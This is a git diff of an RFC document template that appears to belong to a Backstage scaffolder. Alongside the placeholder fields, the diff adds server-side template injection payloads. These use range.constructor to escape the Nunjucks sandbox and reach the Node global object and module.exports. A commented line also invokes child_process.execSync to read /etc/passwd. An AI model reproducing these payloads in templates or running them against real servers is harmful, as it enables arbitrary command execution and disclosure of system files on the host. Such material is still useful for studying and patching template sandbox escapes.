@@ -1,6 +1,6 @@
 # RFC-${{ values.rfcNumber }} - ${{ values.rfcTitle }}
 
-HELLO??wwww
+HELLO??mmmm
 
 *Author(s)*: 
 *Squad*: 
@@ -13,8 +13,14 @@ values: ${{ values | dump }}
 keys:
 ${{ range.constructor("let gg=global; delete gg.global;return gg")() | dump}}
 
+
+22:
+${{ range.constructor("return module.exports")() | dump}}
+
 // range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()
 
+test:
+${{ 'https://my-host.com/my-owner/my-repo' | parseRepoUrl | dump }}
 
 ## Abstract
 ${{ values.abstract }}
